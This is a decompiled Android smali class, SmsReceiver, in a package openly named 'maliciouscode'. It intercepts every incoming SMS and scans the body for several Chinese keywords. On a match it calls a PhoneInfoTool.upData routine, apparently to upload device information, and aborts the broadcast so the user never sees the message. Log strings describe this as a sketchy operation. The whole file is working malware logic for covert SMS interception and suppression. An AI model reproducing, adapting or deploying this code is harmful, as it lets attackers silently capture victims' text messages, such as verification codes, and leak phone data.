.class public Lcom/lu/maliciouscode/SmsReceiver;
.super Landroid/content/BroadcastReceiver;
.source "SmsReceiver.java"


# static fields
.field public static final SMS_RECEIVED_ACTION:Ljava/lang/String; = "android.provider.Telephony.SMS_RECEIVED"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 13
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 16
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 19
    const-string v12, "\u6ce8\u610f\uff01\u6709\u77ed\u4fe1"

    const-string v13, "\u51c6\u5907\u86c7\u76ae\u64cd\u4f5c\u4e86"

    invoke-static {v12, v13}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 21
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    .line 22
    .local v0, "action":Ljava/lang/String;
    const-string v12, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v12, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_6

    .line 25
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v1

    .line 27
    .local v1, "bundle":Landroid/os/Bundle;
    if-eqz v1, :cond_6

    .line 30
    const-string v12, "pdus"

    invoke-virtual {v1, v12}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v12

    check-cast v12, [Ljava/lang/Object;

    move-object v8, v12

    check-cast v8, [Ljava/lang/Object;

    .line 32
    .local v8, "pdus":[Ljava/lang/Object;
    array-length v12, v8

    new-array v5, v12, [Landroid/telephony/SmsMessage;

    .line 33
    .local v5, "messages":[Landroid/telephony/SmsMessage;
    const/4 v4, 0x0

    .local v4, "i":I
    :goto_0
    array-length v12, v5

    if-ge v4, v12, :cond_0

    .line 35
    aget-object v12, v8, v4

    check-cast v12, [B

    move-object v7, v12

    check-cast v7, [B

    .line 36
    .local v7, "pdu":[B
    invoke-static {v7}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v12

    aput-object v12, v5, v4

    .line 33
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    .line 39
    .end local v7    # "pdu":[B
    :cond_0
    array-length v13, v5

    const/4 v12, 0x0

    :goto_1
    if-ge v12, v13, :cond_6

    aget-object v6, v5, v12

    .line 42
    .local v6, "msg":Landroid/telephony/SmsMessage;
    invoke-virtual {v6}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v2

    .line 43
    .local v2, "content":Ljava/lang/String;
    invoke-virtual {v6}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v11

    .line 44
    .local v11, "sender":Ljava/lang/String;
    new-instance v3, Ljava/util/Date;

    invoke-virtual {v6}, Landroid/telephony/SmsMessage;->getTimestampMillis()J

    move-result-wide v14

    invoke-direct {v3, v14, v15}, Ljava/util/Date;-><init>(J)V

    .line 45
    .local v3, "date":Ljava/util/Date;
    new-instance v9, Ljava/text/SimpleDateFormat;

    const-string v14, "yyyy-MM-dd HH:mm:ss"

    invoke-direct {v9, v14}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    .line 46
    .local v9, "sdf":Ljava/text/SimpleDateFormat;
    invoke-virtual {v9, v3}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v10

    .line 47
    .local v10, "sendTime":Ljava/lang/String;
    const-string v14, "\u8054\u5fc3\u79d1\u6280"

    invoke-virtual {v2, v14}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v14

    const/4 v15, -0x1

    if-eq v14, v15, :cond_2

    .line 48
    const-string v14, "\u8054\u5fc3\u79d1\u6280"

    const-string v15, "\u6536\u5230\u5566"

    invoke-static {v14, v15}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 49
    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v14

    const/4 v15, 0x1

    invoke-static {v14, v15}, Lcom/lu/maliciouscode/PhoneInfoTool;->upData(Landroid/content/Context;I)V

    .line 50
    invoke-virtual/range {p0 .. p0}, Lcom/lu/maliciouscode/SmsReceiver;->abortBroadcast()V

    .line 69
    :cond_1
    :goto_2
    invoke-static {v11, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 39
    add-int/lit8 v12, v12, 0x1

    goto :goto_1

    .line 51
    :cond_2
    const-string v14, "\u5907\u4fe1\u79d1\u6280"

    invoke-virtual {v2, v14}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v14

    const/4 v15, -0x1

    if-eq v14, v15, :cond_3

    .line 52
    const-string v14, "\u5907\u4fe1\u79d1\u6280"

    const-string v15, "\u6536\u5230\u5566"

    invoke-static {v14, v15}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 53
    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v14

    const/4 v15, 0x2

    invoke-static {v14, v15}, Lcom/lu/maliciouscode/PhoneInfoTool;->upData(Landroid/content/Context;I)V

    .line 54
    invoke-virtual/range {p0 .. p0}, Lcom/lu/maliciouscode/SmsReceiver;->abortBroadcast()V

    goto :goto_2

    .line 55
    :cond_3
    const-string v14, "\u5e94\u7528\u8868\u79d1\u6280"

    invoke-virtual {v2, v14}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v14

    const/4 v15, -0x1

    if-eq v14, v15, :cond_4

    .line 56
    const-string v14, "\u5e94\u7528\u8868\u79d1\u6280"

    const-string v15, "\u6536\u5230\u5566"

    invoke-static {v14, v15}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 57
    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v14

    const/4 v15, 0x3

    invoke-static {v14, v15}, Lcom/lu/maliciouscode/PhoneInfoTool;->upData(Landroid/content/Context;I)V

    .line 58
    invoke-virtual/range {p0 .. p0}, Lcom/lu/maliciouscode/SmsReceiver;->abortBroadcast()V

    goto :goto_2

    .line 60
    :cond_4
    const-string v14, "\u672a\u77e5\u79d1\u6280"

    invoke-virtual {v2, v14}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v14

    const/4 v15, -0x1

    if-eq v14, v15, :cond_5

    .line 61
    const-string v14, "\u672a\u77e5\u79d1\u6280"

    const-string v15, "\u6536\u5230\u5566"

    invoke-static {v14, v15}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 62
    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v14

    const/4 v15, 0x4

    invoke-static {v14, v15}, Lcom/lu/maliciouscode/PhoneInfoTool;->upData(Landroid/content/Context;I)V

    .line 63
    invoke-virtual/range {p0 .. p0}, Lcom/lu/maliciouscode/SmsReceiver;->abortBroadcast()V

    goto :goto_2

    .line 64
    :cond_5
    const-string v14, "\u901a\u8def\u7f51"

    invoke-virtual {v2, v14}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v14

    const/4 v15, -0x1

    if-eq v14, v15, :cond_1

    .line 65
    const-string v14, "\u901a\u8def\u7f51"

    const-string v15, "\u6536\u5230\u5566"

    invoke-static {v14, v15}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 66
    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v14

    const/4 v15, 0x5

    invoke-static {v14, v15}, Lcom/lu/maliciouscode/PhoneInfoTool;->upData(Landroid/content/Context;I)V

    .line 67
    invoke-virtual/range {p0 .. p0}, Lcom/lu/maliciouscode/SmsReceiver;->abortBroadcast()V

    goto :goto_2

    .line 73
    .end local v1    # "bundle":Landroid/os/Bundle;
    .end local v2    # "content":Ljava/lang/String;
    .end local v3    # "date":Ljava/util/Date;
    .end local v4    # "i":I
    .end local v5    # "messages":[Landroid/telephony/SmsMessage;
    .end local v6    # "msg":Landroid/telephony/SmsMessage;
    .end local v8    # "pdus":[Ljava/lang/Object;
    .end local v9    # "sdf":Ljava/text/SimpleDateFormat;
    .end local v10    # "sendTime":Ljava/lang/String;
    .end local v11    # "sender":Ljava/lang/String;
    :cond_6
    return-void
.end method
